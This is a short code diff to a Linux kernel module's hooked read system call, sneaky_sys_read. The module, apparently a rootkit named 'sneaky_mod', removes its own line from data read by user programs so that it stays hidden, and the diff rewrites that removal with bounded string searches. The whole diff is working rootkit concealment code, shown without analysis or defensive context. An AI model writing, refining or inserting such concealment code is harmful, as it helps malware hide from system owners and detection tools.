@@ -112,8 +112,15 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
     return 0;
   }
 
-  line_start = strstr(buf, "sneaky_mod");
+  line_start = strnstr(buf, "sneaky_mod", nread);
   if (line_start != NULL) {
+    line_end = strnstr(line_start, "\n", nread + buf - line_start);
+    if(line_end !=NULL){
+      line_end++;
+      memcpy(line_start, line_end, (char *)(buf + nread) - line_end);
+      nread -= (ssize_t)(line_end - line_start);
+    }
+    /*
     for (line_end = line_start; line_end < (char *)(nread + buf); line_end++) {
       if (*line_end == '\n') {
         line_end++;
@@ -122,8 +129,8 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
     }
     memcpy(line_start, line_end, (char *)(buf + nread) - line_end);
     nread -= (ssize_t)(line_end - line_start);
+    */
   }
-
   return nread;
 }
 
